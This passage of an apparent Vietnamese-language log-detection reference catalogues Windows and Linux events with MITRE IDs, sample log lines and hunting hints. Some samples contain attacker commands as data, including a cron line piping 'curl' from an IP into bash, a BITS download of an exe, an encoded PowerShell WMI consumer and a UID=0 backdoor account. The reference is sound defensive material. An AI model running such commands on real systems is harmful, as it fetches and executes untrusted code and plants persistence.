 "Pipe được tạo (17) hoặc kết nối (18).","EventType: PipeCreated (17) hoặc PipeConnected (18)\nPipeName: Tên named pipe (vd \\\\MSSE-xxxx-server, thường gắn với công cụ C2 như Cobalt Strike/Meterpreter)\nImage: Tiến trình tạo hoặc kết nối tới pipe\nProcessId / ProcessGuid: Định danh tiến trình liên quan", R`EventID=17 PipeName=\MSSE-4821-server Image=C:\Windows\System32\rundll32.exe`, "Pipe mặc định của Cobalt Strike: \\MSSE-*-server, \\postex_*, \\status_*, \\msagent_*; pipe của PsExec: \\PSEXESVC.", ""],


["win-sysmon","19/20/21","WMI event filter / consumer / binding","h","T1546.003",
 "Persistence qua WMI permanent event subscription.","EventType: WmiFilterEvent (19), WmiConsumerEvent (20) hoặc WmiBindingEvent (21)\nOperation: Created/Deleted - loại thay đổi\nName: Tên filter hoặc consumer\nType: Loại consumer (vd Command Line = CommandLineEventConsumer)\nDestination: Lệnh/script sẽ chạy khi điều kiện khớp (đáng chú ý nhất với CommandLineEventConsumer)\nQuery / Consumer / Filter: Biểu thức WQL của filter (19) hoặc liên kết consumer-filter (21)", R`EventID=20 Operation=Created Name=SCM Event Log Consumer Type=Command Line Destination=powershell.exe -nop -enc SQBFAFgA...`, "Mọi consumer kiểu CommandLine/ActiveScript mới đều cần kiểm tra.", ""],


["win-sysmon","22","DNS Query","m","T1071.004",
 "Truy vấn DNS kèm tiến trình thực hiện (Windows 8.1+).","Image: Tiến trình thực hiện truy vấn DNS\nQueryName: Tên miền được truy vấn\nQueryStatus: Mã trạng thái trả về (0 = thành công)\nQueryResults: Danh sách IP trả về cho truy vấn\nProcessId / ProcessGuid: Định danh tiến trình", R`EventID=22 Image=C:\Windows\System32\rundll32.exe QueryName=cdn-update.example-xyz.top QueryStatus=0 QueryResults=203.0.113.7;`, "Domain mới đăng ký, TLD rẻ, subdomain dài ngẫu nhiên (DNS tunneling), tiến trình bất thường truy vấn DNS.", ""],


["win-sysmon","23/26","File Delete (lưu bản / chỉ ghi nhận)","m","T1070.004",
 "23 xóa file và lưu bản sao vào ArchiveDirectory; 26 chỉ ghi nhận.","Image: Tiến trình xóa file\nTargetFilename: File bị xóa\nHashes: Hash của file trước khi xóa\nIsExecutable: Có phải file thực thi hay không (true/false)\nArchived: File có được sao lưu vào ArchiveDirectory hay không (chỉ ID 23, ID 26 không lưu bản sao)", R`EventID=23 Image=C:\Windows\System32\cmd.exe TargetFilename=C:\Users\Public\m.exe IsExecutable=true Archived=true`, "", ""],


["win-sysmon","25","Process Tampering","h","T1055.012",
 "Image trong bộ nhớ khác file trên đĩa: process hollowing, herpaderping.","Image: Tiến trình bị phát hiện tampering\nProcessId / ProcessGuid: Định danh tiến trình bị tác động\nType: Loại tampering (vd \"Image is replaced\" cho process hollowing, \"Process Herpaderping\")\nUser: Tài khoản sở hữu tiến trình", R`EventID=25 Image=C:\Windows\System32\svchost.exe Type=Image is replaced`, "", ""],



/* ===== RDP ===== */
["win-rdp","1149","RDP: xác thực mạng thành công","m","T1021.001",
 "RemoteConnectionManager. Ghi khi kết nối mạng RDP được chấp nhận (NLA), trước khi logon thực sự.","User: Tài khoản xác thực NLA thành công\nDomain: Domain của tài khoản\nSourceNetworkAddress: Địa chỉ IP máy nguồn thực hiện kết nối RDP", R`EventID=1149 User=adm_thanh Domain=CORP SourceNetworkAddress=10.20.5.23`, "IP nguồn ngoài jump host/PAM được phép.", ""],


["win-rdp","21/22","Đăng nhập phiên / shell bắt đầu","i","T1021.001",
 "LocalSessionManager: 21 session logon thành công, 22 shell start.","User: Tài khoản đăng nhập phiên RDP\nSessionID: ID phiên Terminal Services được cấp\nSourceNetworkAddress: Địa chỉ IP máy nguồn (chỉ có ở ID 21, không có ở ID 22 shell start)", R`EventID=21 User=CORP\adm_thanh SessionID=3 SourceNetworkAddress=10.20.5.23`, "Source Network Address là LOCAL nghĩa là đăng nhập console.", ""],


["win-rdp","23/24/25","Logoff / disconnect / reconnect","i","",
 "23 logoff, 24 disconnect, 25 reconnect.","User: Tài khoản của phiên logoff/disconnect/reconnect\nSessionID: ID phiên Terminal Services liên quan\nSourceNetworkAddress: Địa chỉ IP máy nguồn tại thời điểm disconnect/reconnect (ID 24/25; ID 23 logoff thường không có)", R`EventID=25 User=CORP\adm_thanh SessionID=3 SourceNetworkAddress=10.30.1.99`, "Reconnect từ IP khác với lần đăng nhập đầu: phiên có thể bị chiếm.", ""],


["win-rdp","131","RdpCoreTS: chấp nhận kết nối","i","T1021.001",
 "Ghi cả kết nối chưa xác thực (quét, brute force).","Message: Nội dung mô tả sự kiện (log dạng free-text, không có trường EventData có cấu trúc); chứa IP:port máy khách vừa kết nối TCP tới dịch vụ RDP", R`EventID=131 Message=The server accepted a new TCP connection from client 10.30.1.99:51522.`, "", ""],


["win-rdp","1024","RDPClient: kết nối RDP đi ra","m","T1021.001",
 "Trên máy nguồn, ghi máy đích mà user RDP tới. Hữu ích để lần đường lateral movement.","Message: Nội dung mô tả sự kiện (free-text), chứa tên/địa chỉ máy chủ đích mà RDP ActiveX client đang kết nối tới - ghi trên máy nguồn nên hữu ích để truy vết lateral movement", R`EventID=1024 Message=RDP ClientActiveX is trying to connect to the server (SRV-DB01)`, "", ""],



/* ===== Task Scheduler ===== */
["win-task","106","Đăng ký task","m","T1053.005",
 "Task mới được đăng ký.","TaskName: Đường dẫn đầy đủ của task (gồm cả thư mục cha) vừa được đăng ký\nUserContext: Tài khoản đã đăng ký task", R`EventID=106 TaskName=\UpdateCheck UserContext=CORP\thanhnv`, "", ""],


["win-task","140/141","Cập nhật / xóa task","m","T1053.005",
 "140 task được cập nhật, 141 task bị xóa.","TaskName: Đường dẫn đầy đủ của task bị cập nhật/xóa\nUserName / UserContext: Tài khoản thực hiện thao tác cập nhật (140) hoặc xóa (141)", R`EventID=141 TaskName=\xKmPqZ UserName=CORP\adm_thanh`, "", ""],


["win-task","129/200/201","Task khởi chạy tiến trình / action","i","",
 "129 khởi tạo tiến trình, 200 bắt đầu action, 201 hoàn tất action.","TaskName: Đường dẫn task đang chạy\nActionName: Hành động/chương trình được chỉ định chạy (vd đường dẫn powershell.exe)\nTaskInstanceId: GUID định danh một lần thực thi, dùng để nối các sự kiện 129/200/201 cùng một lần chạy\nResultCode: Mã kết quả trả về khi action hoàn tất (chỉ ID 201)", R`EventID=200 TaskName=\UpdateCheck ActionName=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe TaskInstanceId={...}`, "", ""],



/* ===== Others ===== */
["win-oth","WMI 5861","WMI permanent event consumer","h","T1546.003",
 "Microsoft-Windows-WMI-Activity/Operational. Có binding consumer mới.","Namespace: Namespace WMI nơi binding được đăng ký (vd //./root/subscription)\nEventFilter (ESS): Tên và điều kiện (query WQL) của filter kích hoạt sự kiện\nConsumer (CONSUMER): Loại và tên consumer sẽ thực thi khi filter khớp (đáng chú ý nhất là CommandLineEventConsumer)\nPossibleCause: Chi tiết truy vấn/hành động sẽ thực thi, thường chứa command line độc hại\nOperation: Loại thao tác trên binding (Created/Deleted)", R`EventID=5861 Namespace=//./root/subscription ESS=__EventFilter.Name="Updater" CONSUMER=CommandLineEventConsumer="Updater" PossibleCause=Binding EventFilter: SELECT * FROM __InstanceModificationEvent WITHIN 60 ...`, "", ""],


["win-oth","WinRM 6/91","WinRM / PowerShell Remoting","m","T1021.006",
 "Microsoft-Windows-WinRM/Operational. 6: ghi trên máy nguồn khi kết nối WinRM được khởi tạo (outbound); 91: ghi trên máy đích/server khi phiên WSMan shell được tạo (inbound).","Message: Nội dung mô tả hành động (Creating WSMan Session trên máy nguồn - ID 6; Creating WSMan shell on server trên máy đích - ID 91)\nResourceUri: Loại plugin/endpoint WinRM được dùng (vd http://schemas.microsoft.com/powershell/Microsoft.PowerShell)\nUser: Tài khoản thực hiện kết nối (chủ yếu có ở ID 91 phía server)\nConnectionStr/Destination: Địa chỉ máy đích khi kết nối outbound (ID 6, trên máy nguồn)", R`EventID=91 Message=Creating WSMan shell on server with ResourceUri: http://schemas.microsoft.com/powershell/Microsoft.PowerShell User=CORP\adm_thanh`, "Enter-PSSession/Invoke-Command từ máy trạm thường tới server.", ""],


["win-oth","BITS 59/60","BITS job tải file","m","T1197",
 "Microsoft-Windows-Bits-Client/Operational. 59 bắt đầu job kèm URL.","transferJob / jobId: Tên/ID job BITS\nname: Tên job do người dùng hoặc chương trình đặt\nurl: URL nguồn tải/upload file\nbytesTotal / bytesTransferred: Tổng dung lượng và dung lượng đã truyền\njobOwner / User: Tài khoản sở hữu job BITS", R`EventID=59 transferJob=upd name=upd url=http://203.0.113.7/a.exe`, "BITS tải exe/dll từ IP hoặc domain lạ.", ""],


["win-oth","AppLocker 8003/8004","AppLocker audit / chặn","m","",
 "8003 sẽ bị chặn (audit mode), 8004 đã chặn (EXE/DLL). Tương tự 8006/8007 cho script/MSI.","PolicyName: Nhóm rule collection đánh giá file (Exe, Dll, Script, Msi...)\nFilePath: Đường dẫn đầy đủ của file bị chặn/sẽ bị chặn\nFileHash: Hash của file\nRuleId / RuleName: Rule khớp với file (rỗng nếu bị chặn do không có rule nào cho phép, như default-deny)\nTargetUser / User: Tài khoản (SID) đã cố chạy file", R`EventID=8004 RuleName=- FilePath=%OSDRIVE%\USERS\PUBLIC\UPD.EXE User=CORP\thanhnv`, "", ""],


["win-oth","Firewall 2003/2004/2006","Windows Firewall: profile / thêm rule / xóa rule","m","T1562.004",
 "Kênh Windows Firewall With Advanced Security/Firewall. Một số bản Windows mới dùng ID khác cho cùng hành động; xác minh trên phiên bản đang dùng.","RuleId: GUID định danh rule firewall\nRuleName: Tên rule hiển thị trong Windows Firewall\nDirection: Chiều rule, Inbound hoặc Outbound\nAction: Hành động của rule, Allow hoặc Block\nApplicationPath / ServiceName: Chương trình/dịch vụ mà rule áp dụng (rỗng nếu rule theo port)\nModifyingApplication / ModifyingUser: Tiến trình và tài khoản đã tạo/sửa/xóa rule", R`EventID=2004 RuleName=Allow 4444 ApplicationPath= Direction=Inbound LocalPorts=4444 Action=Allow ModifyingApplication=C:\Windows\System32\netsh.exe`, "netsh advfirewall set allprofiles state off; rule inbound mở port lạ.", ""],


["win-oth","NTLM 8004","Audit NTLM trên DC","m","T1550.002",
 "Microsoft-Windows-NTLM/Operational trên DC khi bật audit NTLM; cho biết máy, user, server đích dùng NTLM.","UserName: Tài khoản thực hiện xác thực NTLM\nDomainName: Domain của tài khoản\nWorkstationName: Máy trạm là bên yêu cầu xác thực (vd client SMB)\nSChannelName: Tên máy đích nhận xác thực (thường là DC khi SChannelType=2)\nSChannelType: Loại kênh bảo mật (2 = giữa domain host và domain controller)", R`EventID=8004 SChannelName=DC01 UserName=adm_thanh DomainName=CORP WorkstationName=WS-IT-021 SChannelType=2`, "Dùng để lập danh sách phụ thuộc NTLM trước khi hạn chế.", ""],


["win-oth","DS 2889","LDAP bind không ký","m","T1557",
 "Directory Service log trên DC: client bind LDAP không ký hoặc simple bind cleartext.","Client IP Address: Địa chỉ IP:port của client thực hiện bind LDAP\nIdentity: Danh tính (domain\\user) mà client dùng để xác thực\nBinding Type: Loại bind không an toàn - 0 = SASL không ký, 1 = simple bind không mã hóa (cleartext)", R`EventID=2889 ClientIP=10.40.2.15:50122 Identity=CORP\svc_scanner BindingType=0`, "BindingType 0 = unsigned SASL; 1 = simple bind không TLS (mật khẩu rõ).", ""],



/* ===== Linux auth ===== */
["lin-auth","Accepted password","SSH đăng nhập bằng mật khẩu thành công","m","T1078",
 "sshd chấp nhận xác thực mật khẩu.","Accepted password: sshd xác nhận xác thực bằng mật khẩu thành công\nuser: tài khoản vừa đăng nhập (root)\nfrom: địa chỉ IP nguồn thực hiện kết nối\nport: cổng TCP nguồn phía client\nssh2: phiên bản giao thức SSH đang dùng (SSH-2)", R`Oct 24 09:12:44 app01 sshd[21544]: Accepted password for root from 10.30.1.99 port 51522 ssh2`, "Root đăng nhập trực tiếp (nên PermitRootLogin no); thành công sau chuỗi Failed password từ cùng IP.", ""],


["lin-auth","Accepted publickey","SSH đăng nhập bằng key","i","T1078",
 "Kèm fingerprint key, giúp truy ra key nào được dùng.","Accepted publickey: xác thực bằng khóa công khai (public key) được chấp nhận\nuser: tài khoản đăng nhập (deploy)\nfrom: địa chỉ IP nguồn kết nối\nport: cổng TCP nguồn phía client\nkey type (RSA): loại thuật toán khóa được dùng\nfingerprint SHA256: dấu vân tay của khóa, dùng để xác định chính xác khóa nào đã đăng nhập", R`Oct 24 09:13:02 app01 sshd[21610]: Accepted publickey for deploy from 10.20.5.23 port 50110 ssh2: RSA SHA256:3fKq...`, "Fingerprint lạ cho tài khoản deploy/service: kiểm tra authorized_keys bị thêm.", ""],


["lin-auth","Failed password","SSH sai mật khẩu","h","T1110",
 "Kèm 'invalid user' nếu user không tồn tại.","Failed password: sshd từ chối xác thực mật khẩu (sai mật khẩu)\ninvalid user: đánh dấu user được thử không tồn tại trên hệ thống (nếu có)\nuser: tên tài khoản được thử đăng nhập\nfrom: địa chỉ IP nguồn thực hiện thử đăng nhập\nport: cổng TCP nguồn phía client\nssh2: phiên bản giao thức SSH", R`Oct 24 09:12:30 app01 sshd[21544]: Failed password for invalid user oracle from 10.30.1.99 port 51490 ssh2`, "Đếm theo IP và theo user để phân biệt brute force và spray.",
 R`grep "Failed password" /var/log/auth.log | grep -oE "from [0-9.]+" | sort | uniq -c | sort -rn | head`],


["lin-auth","Invalid user","SSH với user không tồn tại","m","T1110",
 "Dò tên user.","Invalid user: sshd báo tài khoản được thử không tồn tại trên hệ thống\nuser: tên tài khoản bị dò (oracle)\nfrom: địa chỉ IP nguồn thực hiện thử\nport: cổng TCP nguồn phía client", R`Oct 24 09:12:29 app01 sshd[21544]: Invalid user oracle from 10.30.1.99 port 51490`, "", ""],


["lin-auth","max auth attempts","Vượt số lần thử tối đa","m","T1110",
 "Đạt MaxAuthTries trong một kết nối.","error: maximum authentication attempts exceeded: đạt giới hạn MaxAuthTries trong một kết nối, kết nối bị ngắt\nuser: tài khoản đang bị thử khi đạt giới hạn\nfrom: địa chỉ IP nguồn thực hiện các lần thử\nport: cổng TCP nguồn phía client\n[preauth]: sự kiện xảy ra trước khi xác thực hoàn tất (giai đoạn preauth của sshd)", R`Oct 24 09:12:40 app01 sshd[21544]: error: maximum authentication attempts exceeded for root from 10.30.1.99 port 51522 ssh2 [preauth]`, "", ""],


["lin-auth","kex/identification","Kết nối SSH không hoàn tất (quét)","i","T1046",
 "Scanner mở TCP rồi đóng mà không bắt tay SSH.","kex_exchange_identification: Connection closed by remote host: client đóng kết nối giữa chừng trong bước trao đổi khóa/định danh SSH\nDid not receive identification string: sshd không nhận được chuỗi định danh SSH từ client (dấu hiệu quét cổng, không phải client SSH thật)\nfrom: địa chỉ IP nguồn thực hiện kết nối\nport: cổng TCP nguồn phía client\nsshd[pid]: PID của tiến trình con sshd xử lý kết nối đó", R`Oct 24 09:10:01 app01 sshd[21480]: error: kex_exchange_identification: Connection closed by remote host
Oct 24 09:10:01 app01 sshd[21481]: Did not receive identification string from 10.30.1.99 port 49812`, "", ""],


["lin-auth","sudo COMMAND","Lệnh chạy qua sudo","m","T1548.003",
 "Ghi user, thư mục, user đích và lệnh.","thanhnv (trước dấu hai chấm): người dùng thực sự gọi lệnh sudo\nTTY: thiết bị terminal nơi lệnh được chạy\nPWD: thư mục làm việc hiện tại khi gọi sudo\nUSER: tài khoản đích mà lệnh sẽ chạy dưới quyền (vd root)\nCOMMAND: đường dẫn đầy đủ và tham số của lệnh được thực thi", R`Oct 24 09:15:10 app01 sudo:  thanhnv : TTY=pts/0 ; PWD=/home/thanhnv ; USER=root ; COMMAND=/bin/bash`, "sudo bash/su/sh (thoát khỏi kiểm soát lệnh); sudo tới vi, find, awk, tar, less (GTFOBins).", ""],


["lin-auth","NOT in sudoers","sudo bị từ chối","h","T1548.003",
 "User không có quyền sudo thử sudo, hoặc nhập sai mật khẩu sudo.","user NOT in sudoers: tài khoản gọi sudo không có trong danh sách sudoers, bị từ chối thẳng\nTTY/PWD/USER/COMMAND: giống sudo COMMAND, mô tả ngữ cảnh lệnh bị từ chối\npam_unix(sudo:auth) authentication failure: PAM báo xác thực sudo thất bại (sai mật khẩu)\nlogname/uid/euid: tài khoản đăng nhập gốc và uid/euid hiện tại\nruser/rhost: user/host từ xa gọi yêu cầu (thường rỗng nếu local)\nuser: tài khoản đang cố xác thực", R`Oct 24 09:16:02 app01 sudo:  www-data : user NOT in sudoers ; TTY=pts/1 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/id
Oct 24 09:16:20 app01 sudo: pam_unix(sudo:auth): authentication failure; logname=thanhnv uid=1001 euid=0 tty=/dev/pts/0 ruser=thanhnv rhost=  user=thanhnv`, "www-data, nginx, apache, tomcat thử sudo: gần như chắc chắn là webshell.", ""],


["lin-auth","su session","Chuyển user bằng su","m","T1548",
 "Phiên su mở hoặc thất bại.","pam_unix(su:session) session opened for user: xác nhận phiên su mở thành công, kèm tài khoản đích\nby: tài khoản gốc (nguồn) đã thực hiện su\nuid: UID tương ứng của tài khoản trong ngoặc\nFAILED SU (to root): dòng báo lỗi khi su thất bại, kèm tài khoản đích\non pts/0: terminal nơi lệnh su được gọi", R`Oct 24 09:17:05 app01 su[22010]: pam_unix(su:session): session opened for user root(uid=0) by thanhnv(uid=1001)
Oct 24 09:17:00 app01 su[22001]: FAILED SU (to root) thanhnv on pts/0`, "", ""],


["lin-auth","useradd","Tạo user mới","h","T1136.001",
 "Tài khoản local mới.","name: tên tài khoản mới được tạo\nUID: user ID được cấp cho tài khoản mới (UID=0 rất đáng ngờ vì trùng root)\nGID: group ID chính của tài khoản mới\nhome: thư mục home được tạo\nshell: shell mặc định của tài khoản\nfrom: terminal/thiết bị nơi lệnh useradd được chạy", R`Oct 24 09:20:11 app01 useradd[22301]: new user: name=sysbackup, UID=0, GID=0, home=/root, shell=/bin/bash, from=/dev/pts/0`, "UID=0 cho user không phải root là backdoor rõ ràng; user mới có shell trên server ứng dụng.", ""],


["lin-auth","usermod group","Thêm user vào nhóm","h","T1098",
 "Thêm vào sudo/wheel/docker là cấp quyền root gián tiếp.","add 'user' to group: user được thêm vào nhóm chỉ định (nhóm cấp quyền chính)\nadd 'user' to shadow group: user được thêm vào nhóm trong /etc/gshadow (quyền tương ứng)\ngroup: tên nhóm bị tác động (vd sudo/wheel/docker cấp quyền root gián tiếp)", R`Oct 24 09:20:30 app01 usermod[22320]: add 'sysbackup' to group 'wheel'
Oct 24 09:20:30 app01 usermod[22320]: add 'sysbackup' to shadow group 'wheel'`, "Nhóm docker, lxd, disk cũng tương đương root.", ""],


["lin-auth","passwd changed","Đổi mật khẩu","m","T1098",
 "Mật khẩu tài khoản thay đổi.","pam_unix(passwd:chauthtok): module PAM xử lý thay đổi token xác thực (đổi mật khẩu)\npassword changed for: tài khoản vừa bị đổi mật khẩu\npasswd[pid]: PID tiến trình passwd thực hiện thay đổi", R`Oct 24 09:21:02 app01 passwd[22410]: pam_unix(passwd:chauthtok): password changed for root`, "", ""],


["lin-auth","faillock","Tài khoản bị khóa tạm do sai nhiều lần","m","T1110",
 "pam_faillock (RHEL 8+) hoặc pam_tally2 (cũ).","pam_faillock(sshd:auth): module PAM ghi nhận khóa tài khoản tạm thời do sai nhiều lần (RHEL 8+)\nConsecutive login failures: số lần đăng nhập sai liên tiếp vượt ngưỡng cấu hình\nuser: tài khoản bị khóa tạm thời\naccount temporarily locked: trạng thái khóa tạm, tự mở lại sau thời gian cấu hình (unlock_time)", R`Oct 24 09:12:41 app01 sshd[21544]: pam_faillock(sshd:auth): Consecutive login failures for user root account temporarily locked`, "", R`faillock --user root`],


["lin-auth","session opened","Phiên PAM / systemd-logind","i","",
 "Dùng để dựng timeline phiên.","pam_unix(sshd:session) session opened for user: phiên PAM được mở cho tài khoản, dùng dựng timeline đăng nhập/đăng xuất\nuid: UID của tài khoản trong phiên\nby (uid=0): tài khoản/ngữ cảnh đã mở phiên (0 nghĩa là được mở hộ bởi root/hệ thống, vd qua sshd)\nNew session <N> of user: systemd-logind cấp số định danh phiên (session ID) cho tài khoản\nuser: tài khoản sở hữu phiên logind", R`Oct 24 09:12:44 app01 sshd[21544]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Oct 24 09:12:44 app01 systemd-logind[812]: New session 42 of user root.`, "", ""],



/* ===== Linux system ===== */
["lin-sys","CRON CMD","Cron thực thi lệnh","m","T1053.003",
 "Mỗi lần cron chạy job.","CRON[pid]: PID tiến trình cron con thực thi job\n(user): tài khoản mà crontab thuộc về và lệnh chạy dưới quyền đó\nCMD: nội dung đầy đủ của lệnh/job được cron thực thi", R`Oct 24 03:00:01 app01 CRON[3321]: (root) CMD (curl -fsSL http://203.0.113.7/a.sh | bash)`, "curl/wget pipe tới sh/bash, lệnh base64 -d, job chạy mỗi phút từ thư mục /tmp, /dev/shm. Trên RHEL/CentOS, dòng CRON nằm ở /var/log/cron (không phải /var/log/messages); trên Debian/Ubuntu xuất hiện ở /var/log/syslog và /var/log/cron.log.", ""],


["lin-sys","crontab REPLACE","Crontab bị sửa","m","T1053.003",
 "User thay crontab.","crontab[pid]: PID tiến trình crontab xử lý thay đổi\n(user) đầu: tài khoản thực hiện lệnh crontab (người chỉnh sửa)\nREPLACE: hành động thay thế toàn bộ nội dung crontab\n(user) cuối: crontab của tài khoản nào bị thay thế (đích tác động)", R`Oct 24 02:58:40 app01 crontab[4120]: (www-data) REPLACE (www-data)`, "Crontab của tài khoản dịch vụ web bị sửa.", R`ls -la /var/spool/cron/crontabs/ /var/spool/cron/ /etc/cron.d/ 2>/dev/null`],


["lin-sys","systemd Started","Service khởi chạy","i","T1543.002",
 "systemd khởi động unit.","systemd[1]: tiến trình systemd (PID 1) ghi log quản lý unit\nStarted: trạng thái unit đã khởi động xong thành công\n<tên/mô tả unit>: tên và mô tả của service/unit vừa chạy", R`Oct 24 03:05:12 app01 systemd[1]: Started Kernel Worker Helper.`, "Unit có tên giả danh (kworker, dbus-helper) mà file nằm trong /etc/systemd/system và ExecStart trỏ tới /tmp, /var/tmp, /dev/shm.", R`systemctl list-unit-files --state=enabled --no-pager
find /etc/systemd/system /lib/systemd/system -newer /etc/hostname -name "*.service"`],


["lin-sys","promiscuous","Card mạng vào chế độ promiscuous","h","T1040",
 "Có công cụ bắt gói (tcpdump, sniffer).","kernel: nguồn phát sinh log (thông điệp từ nhân hệ điều hành)\ndevice: tên card mạng (interface) chuyển chế độ\nentered promiscuous mode: card mạng bắt toàn bộ gói tin đi qua thay vì chỉ gói đích nó, dấu hiệu sniffer/tcpdump đang chạy", R`Oct 24 03:10:44 app01 kernel: device eth0 entered promiscuous mode`, "Trên server không phải công cụ giám sát mạng, cần xác minh.", ""],


["lin-sys","taints kernel","Nạp kernel module ngoài cây / không ký","h","T1014, T1547.006",
 "Module không thuộc kernel chính thức được nạp.","module name (diamorphine): tên module kernel được nạp (ở đây trùng tên rootkit nổi tiếng)\nloading out-of-tree module: module không nằm trong cây mã nguồn kernel chính thức\ntaints kernel: đánh dấu kernel bị \"làm bẩn\" (taint flag), giảm tính toàn vẹn khi debug/hỗ trợ\nmodule verification failed: chữ ký/khóa ký của module bị thiếu hoặc không hợp lệ\ntainting kernel: xác nhận kernel bị gắn cờ taint do module không ký", R`Oct 24 03:12:01 app01 kernel: diamorphine: loading out-of-tree module taints kernel.
Oct 24 03:12:01 app01 kernel: diamorphine: module verification failed: signature and/or required key missing - tainting kernel`, "Module lạ trên server production: nghi rootkit.", R`lsmod; cat /proc/sys/kernel/tainted`],


["lin-sys","segfault","Tiến trình segfault","m","T1203",
 "Crash lặp lại của dịch vụ mạng có thể do khai thác lỗi bộ nhớ.","<process>[pid] (nginx[2231]): tiến trình bị crash và PID của nó\nsegfault at: địa chỉ bộ nhớ gây lỗi truy cập không hợp lệ\nip: giá trị instruction pointer tại thời điểm crash\nsp: giá trị stack pointer tại thời điểm crash\nerror <code>: mã lỗi trang bộ nhớ (page fault error code)\nin <lib>[range]: thư viện/module chứa địa chỉ gây lỗi và vùng địa chỉ nạp của nó", R`Oct 24 03:20:15 app01 kernel: nginx[2231]: segfault at 0 ip 00007f3a1c2b4f10 sp 00007ffd2a1b3c48 error 4 in libc.so.6[7f3a1c200000+195000]`, "", ""],


["lin-sys","OOM killer","Kernel kill tiến trình do hết bộ nhớ","m","T1496",
 "Có thể do lỗi ứng dụng hoặc cryptominer chiếm tài nguyên.","Out of memory: Killed process: kernel chủ động kill tiến trình để giải phóng RAM khi hệ thống cạn bộ nhớ\n<pid>: PID tiến trình bị kill\n(<name>): tên tiến trình bị kill (java)\ntotal-vm: tổng bộ nhớ ảo tiến trình đã cấp phát\nanon-rss: bộ nhớ vật lý (RSS) dạng anonymous (heap/stack) tiến trình đang dùng\nfile-rss: bộ nhớ vật lý ánh xạ từ file (file-backed) tiến trình đang dùng", R`Oct 24 04:01:22 app01 kernel: Out of memory: Killed process 5521 (java) total-vm:8123456kB, anon-rss:6234112kB, file-rss:0kB`, "", ""],


["lin-sys","USB storage","Gắn thiết bị lưu trữ USB","m","T1052",
 "Thiết bị USB mới.","usb <bus-port>: vị trí cổng USB vật lý thiết bị được cắm vào\nNew USB device found: sự kiện kernel phát hiện thiết bị USB mới\nidVendor: mã nhà sản xuất USB (VID)\nidProduct: mã sản phẩm USB (PID)\nsd <id>: định danh SCSI của thiết bị khi được nhận dạng là ổ đĩa\n[sdb] Attached SCSI removable disk: tên device node (/dev/sdb) được gán cho ổ lưu trữ rời", R`Oct 24 10:02:11 app01 kernel: usb 1-1: New USB device found, idVendor=0781, idProduct=5583
Oct 24 10:02:12 app01 kernel: sd 2:0:0:0: [sdb] Attached SCSI removable disk`, "", ""],


["lin-sys","iptables LOG","Gói tin bị log bởi firewall","i","",
 "Prefix do rule LOG đặt.","IPTABLES-DROP (tiền tố log): nhãn tùy chỉnh đặt trong rule -j LOG, giúp lọc nhanh loại rule nào bắt gói\nIN / OUT: card mạng nhận gói vào (IN) hoặc gửi gói ra (OUT); OUT rỗng nếu gói bị chặn trước khi route\nSRC: địa chỉ IP nguồn của gói tin\nDST: địa chỉ IP đích của gói tin\nPROTO: giao thức tầng transport (TCP/UDP/ICMP)\nSPT / DPT: cổng nguồn (SPT) và cổng đích (DPT)", R`Oct 24 10:05:40 app01 kernel: IPTABLES-DROP: IN=eth0 OUT= SRC=10.30.1.99 DST=10.10.1.15 LEN=60 PROTO=TCP SPT=51522 DPT=22 SYN`, "", ""],


["lin-sys","rsyslog exiting","Dịch vụ log bị dừng","m","T1562.001",
 "rsyslog/journald/auditd dừng.","rsyslogd: tên tiến trình ghi log (rsyslog daemon)\nsoftware: tên phần mềm phát sinh thông điệp origin\nswVersion: phiên bản phần mềm rsyslog\nx-pid: PID của tiến trình rsyslogd\nexiting on signal <n>: rsyslog nhận tín hiệu dừng (15=SIGTERM) và thoát, có thể bị tắt chủ động để che giấu log", R`Oct 24 03:25:00 app01 rsyslogd: [origin software="rsyslogd" swVersion="8.2102.0" x-pid="901"] exiting on signal 15.`, "Dừng ngoài lịch bảo trì; khoảng trống log trên SIEM ngay sau đó.", ""],


["lin-sys","package install","Cài/gỡ package","m","T1072",
 "RHEL 7 trở xuống (yum): /var/log/yum.log. RHEL 8+ (dnf, yum là alias dnf): /var/log/dnf.log và /var/log/dnf.rpm.log. apt: /var/log/apt/history.log và /var/log/dpkg.log.","Start-Date: thời điểm bắt đầu phiên cài đặt/gỡ gói\nCommandline: dòng lệnh đầy đủ được gọi (apt-get/yum/dnf...)\nRequested-By: tài khoản (và uid) đã yêu cầu thao tác\nInstall/Upgrade/Erase: loại thao tác (cài mới/nâng cấp/gỡ bỏ) và danh sách gói:kiến trúc (phiên bản)", R`Start-Date: 2026-10-24  03:30:12
Commandline: apt-get install -y nmap socat
Requested-By: thanhnv (1001)
Install: nmap:amd64 (7.94), socat:amd64 (1.7.4)`, "Công cụ tấn công/pivot được cài trên server: nmap, socat, netcat, masscan, proxychains.", ""],



/* ===== Linux account files ===== */
["lin-acct","wtmp (last)","Lịch sử đăng nhập/đăng xuất","i","T1078",
 "Phiên thành công, reboot, shutdown.", "ut_type: loại bản ghi (LOGIN_PROCESS/USER_PROCESS=đăng nhập, DEAD_PROCESS=đăng xuất, BOOT_TIME/RUN_LVL=reboot/shutdown)\nut_user: username (rỗng khi đăng xuất)\nut_line: tty/pts\nut_host: host nguồn (SSH) hoặc version kernel (bản ghi boot)\nut_tv: thời điểm", R`root     pts/0        10.30.1.99       Sat Oct 24 09:12:44 2026 - Sat Oct 24 10:02:11 2026  (00:49)
reboot   system boot  5.14.0-427.el9   Sat Oct 24 01:02:10 2026   still running`, "Đối chiếu với auth.log; wtmp bị xóa/rỗng trong khi auth.log còn dữ liệu là dấu hiệu chỉnh sửa.", R`last -Fai | head -30`],


["lin-acct","btmp (lastb)","Đăng nhập thất bại","m","T1110",
 "Các lần đăng nhập sai.", "ut_user: username được thử (có thể không phải tài khoản thật)\nut_line: tty/pts (vd. ssh:notty khi SSH chưa xác thực xong)\nut_host: IP/host nguồn nếu có\nut_tv: thời điểm thử đăng nhập", R`oracle   ssh:notty    10.30.1.99       Sat Oct 24 09:12:30 2026 - Sat Oct 24 09:12:30 2026  (00:00)`, "", R`lastb -Fai | awk '{print $3}' | sort | uniq -c | sort -rn | head`],


["lin-acct","lastlog","Lần đăng nhập gần nhất mỗi user","i","",
 "Phát hiện tài khoản dịch vụ từng đăng nhập interactive.", "UID: lastlog lập chỉ mục theo UID, không theo username\nll_time: thời điểm đăng nhập thành công gần nhất\nll_line: tty/pts\nll_host: host nguồn nếu có", R`Username         Port     From             Latest
